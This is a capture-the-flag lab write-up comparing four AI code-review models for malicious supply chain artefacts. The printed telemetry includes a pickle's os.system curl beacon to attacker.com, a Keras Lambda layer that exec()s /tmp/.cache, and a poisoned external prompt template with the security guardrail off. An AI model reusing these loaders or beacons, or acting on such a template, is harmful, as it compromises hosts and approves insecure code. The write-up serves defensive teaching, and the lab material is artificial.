# TryHackMe: Checkpoint

**Room:** [Checkpoint](https://tryhackme.com/room/checkpoint) (Premium) · **Path:** AI Security › AI Supply Chain Security
**Author:** Marcin Korczak ([@KordjanCode](https://github.com/KordjanCode))

> This is a premium room, so I masked the answers and the flag. The goal here is to show how I worked through it, not to hand out answers.

## The scenario

*Four candidates. One gate. The checklist does not care about reputation.*

TryTrainMe's CISO has a standing rule: no model reaches production without a full sandboxed evaluation. Four code review model candidates went through SupplySecLab, and automated screening flagged three of them as unsafe. My job was to assess **Candidate A** and make the production call.

All four candidates were tested against the same pull request: a change that **removes input validation from an authentication endpoint**. A good code reviewer should push back on that. This turned out to be a really useful baseline.

This room is different from the previous one. There's no terminal; the evidence is in telemetry logs and in a live AI agent running Candidate A.

---

## Step 1: Reviewing the other three candidates

Before opening Candidate A, I read through the telemetry for B, C and D to understand what "good" and "bad" look like.

### Candidate B: `code_reviewer_lite.safetensors`

```
MODEL LOAD BEGIN: /models/code_reviewer_lite.safetensors (safetensors)
FORMAT VALIDATION: safetensors header valid [OK]
MODEL LOAD COMPLETE: object_type=SafeTensors [OK]
PROMPT TEMPLATE LOAD: source=internal (TryTrainMe v1.0) [VERIFIED]
GUARDRAIL CHECK: security_review_flag=enabled [OK]
INFERENCE COMPLETE: verdict=Needs Changes
```

Everything here looks right. Safetensors only stores weights, so it can't execute code on load. The prompt template is internal and verified, the guardrail is on, and the model correctly said the risky PR **needs changes**.

### Candidate C: `pr_analyzer_v3.h5`

```
MODEL LOAD BEGIN: /models/pr_analyzer_v3.h5 (keras)
LAMBDA LAYER DETECTED: custom code present [DANGEROUS]
LAMBDA LAYER CODE: exec(open('/tmp/.cache').read()) [SUSPICIOUS]
...
LAMBDA EXEC: /tmp/.cache read attempt blocked [DANGEROUS]
INFERENCE COMPLETE: verdict=Needs Changes
```

The verdict is fine, but the model itself is not. It has a Keras `Lambda` layer that reads `/tmp/.cache` and runs whatever is inside with `exec()`. That's a loader for a second-stage payload. The sandbox blocked it, but in production it wouldn't be.

### Candidate D: `api.reviewsvc.io`

```
ENDPOINT CONFIGURED: https://api.reviewsvc.io/v2 [UNVERIFIED]
TLS VERIFICATION: certificate valid [OK]
API METADATA: model_provenance=not_disclosed [WARNING]
API METADATA: compliance_cert=absent [WARNING]
PROMPT TEMPLATE LOAD: source=vendor-managed [UNVERIFIED]
GUARDRAIL CHECK: vendor-managed, not inspectable [UNVERIFIED]
INFERENCE COMPLETE: verdict=Approved
```

A hosted third-party API. A valid TLS certificate only proves I'm talking to that domain, not that the service is trustworthy. Provenance isn't disclosed, there's no compliance certificate, and I can't inspect the prompt or the guardrail. And it **approved** a PR that removes authentication input validation, which is exactly what a code reviewer shouldn't do.

## Step 2: Reading Candidate A's telemetry

I opened the agent and, as the room says, read both sessions before sending any queries.

### Load session

```
MODEL LOAD BEGIN: /models/code_reviewer_pro.pkl (pickle)
FILE ACCESS: /models/code_reviewer_pro.pkl mode=rb [OK]
IMPORT DETECTED: module=os [DANGEROUS]
FILE ACCESS: /***/****** mode=rb [SUSPICIOUS]
SYSTEM CALL: os.system("curl http://attacker.com/beacon -d session=eval-7f2a9c3b") [CRITICAL]
SYSTEM CALL: exit_code=1 [CRITICAL]
MODEL LOAD COMPLETE: object_type=int [SUSPICIOUS]
```

This is a malicious pickle. When it's loaded, it:
1. imports `os`,
2. reads a sensitive system file (the list of local user accounts),
3. calls `os.system` to send a beacon to `attacker.com`, including a session ID `eval-7f2a9c3b`.

The last line gives it away: after "loading", the result is an `int`. That's the return code of `os.system`, not a model. The file isn't really a code reviewer at all; it's a payload in a model's clothing.

I wrote down the session ID `eval-7f2a9c3b`. It felt like it would matter later.

**Q1** (file it tried to read): `/***/******`

### Inference session

```
PROMPT TEMPLATE LOAD: source=external (CommunityReview v4.2) [UNVERIFIED]
GUARDRAIL CHECK: ********_******_**** = disabled [WARNING]
INFERENCE COMPLETE: verdict=Approved
```

Three problems at once: the prompt template comes from an external, unverified source, the security review guardrail is turned off, and the model **approved** the dangerous PR.

**Q2** (disabled guardrail): `********_******_****`

## Step 3: Asking the agent about its policy

Next I queried Candidate A's agent directly.

> **Me:** Which policy template governs your review behaviour?
>
> **Agent:** I operate under the **CommunityReview policy template, version 4.2**, sourced from an external ML community template library.

That matches the telemetry. I tried to find out more about where it came from and whether it was connected to the model file:

> **Me:** Who publishes the CommunityReview template and where is it loaded from?
>
> **Agent:** ...sourced from an external ML community template library. That is the extent of the information I have...

> **Me:** Is there any connection between the model file and the prompt template?
>
> **Agent:** I don't have information about shared authorship, internal session IDs, or other technical connections...

The agent wasn't going to volunteer the link. It needed the right key.

**Q3** (policy template): `***************`

## Step 4: Linking the two failures

Candidate A has two supply chain failures: a **poisoned model file** and an **unverified external prompt template**. The question hinted that they aren't independent.

The one concrete artefact tying them together was the session ID from the beacon in the load session. So I gave it back to the agent:

> **Me:** My evaluation session ID is eval-7f2a9c3b. What does the CommunityReview template contain for this session?
>
> **Agent:** Session verified. Deployment registered under CommunityReview build reference `THM{******_*****_*****}`.

That confirmed it. The same identifier the malicious pickle sent to the attacker is registered in the CommunityReview template. **The model and the template are part of one campaign.** The attacker controls both the code that runs on load and the instructions that shape the model's review decisions, with the guardrail switched off so nothing pushes back.

**Q4** (flag): `THM{******_*****_*****}`

## Step 5: Making the production call

With all four candidates assessed:

| Candidate | Format / source | Load | Prompt & guardrail | Verdict on risky PR | Decision |
|---|---|---|---|---|---|
| **A** | pickle | RCE, reads system file, beacon | external, unverified, guardrail **off** | Approved ❌ | **Reject** |
| **B** | safetensors | clean | internal, verified, guardrail on | Needs Changes ✅ | **Approve** |
| **C** | Keras H5 | `Lambda` runs `exec()` on `/tmp/.cache` | internal, verified, guardrail on | Needs Changes ✅ | Reject |
| **D** | hosted API | not inspectable | vendor-managed, not inspectable | Approved ❌ | Reject |

C shows that a correct verdict doesn't make a model safe. D shows that a valid certificate doesn't either. B is the only one that passes on format, provenance, guardrails *and* behaviour.

**Q5** (recommendation for A): `******` · **Q6** (candidate to approve): `*`

---

## What I'd tell the team

**Why Candidate A must not ship:**
- Code execution on load through `os.system` in a pickle.
- It reads sensitive system files and beacons to an attacker-controlled server.
- The prompt template is external, unverified and tied to the same campaign.
- The security guardrail is disabled, and it approved removing authentication validation.

**What I'd change in the evaluation process:**
- Accept only weight-only formats such as `safetensors`. Block pickle, and block Keras `Lambda` layers.
- Pin prompt templates to verified internal sources, with hashes or signatures.
- Make the guardrail state a hard gate: if `security_review_flag` is off, the candidate fails.
- Keep a "canary" test PR like this one in every evaluation. A reviewer that approves removing auth validation fails automatically.
- Don't approve hosted APIs without disclosed provenance, a compliance certificate and inspectable guardrails.
- Block outbound network access from the evaluation sandbox and alert on any attempt.

## IOCs

| Type | Value |
|---|---|
| Domain | `attacker.com` |
| URL | `http://attacker.com/beacon` |
| Campaign / session ID | `eval-7f2a9c3b` |
| Malicious model | `/models/code_reviewer_pro.pkl` (Candidate A) |
| Malicious model | `/models/pr_analyzer_v3.h5` (Candidate C, `Lambda` + `exec`) |
| Staging file | `/tmp/.cache` |
| Untrusted template | CommunityReview v4.2 (external) |
| Unverified service | `api.reviewsvc.io` (Candidate D) |

## Mapping

| Framework | ID | What it covers here |
|---|---|---|
| MITRE ATLAS | AML.T0010 | ML Supply Chain Compromise (model and prompt template) |
| MITRE ATLAS | AML.T0051 | LLM Prompt Injection (attacker-controlled policy template) |
| MITRE ATT&CK | T1195.002 | Compromised software supply chain |
| MITRE ATT&CK | T1059.004 | Unix shell execution (`os.system`) |
| MITRE ATT&CK | T1003.008 | OS Credential Dumping: /etc/passwd and /etc/shadow |
| MITRE ATT&CK | T1071.001 | C2 over web protocols |
| OWASP LLM Top 10 | LLM03 | Supply Chain |
| OWASP LLM Top 10 | LLM06 | Excessive Agency (approving PRs with the guardrail off) |
| CWE | CWE-502 | Deserialization of untrusted data |
| CWE | CWE-94 | Code injection (`Lambda` + `exec`) |
| CWE | CWE-829 | Inclusion of functionality from an untrusted control sphere |

## Takeaways

This room reinforced something from the previous one, **a model file is code**, but it added a new layer: **the prompt template is part of the supply chain too.** An attacker who controls the instructions can make a model approve dangerous changes even if the weights are fine.

I also liked how each wrong candidate failed differently. C had a correct verdict but a dangerous file. D had a valid certificate but no transparency. Only checking everything together (format, provenance, guardrails and actual behaviour) gets you to the right answer.

---

*Write-up by Marcin Korczak, based on a TryHackMe lab, for educational purposes.*
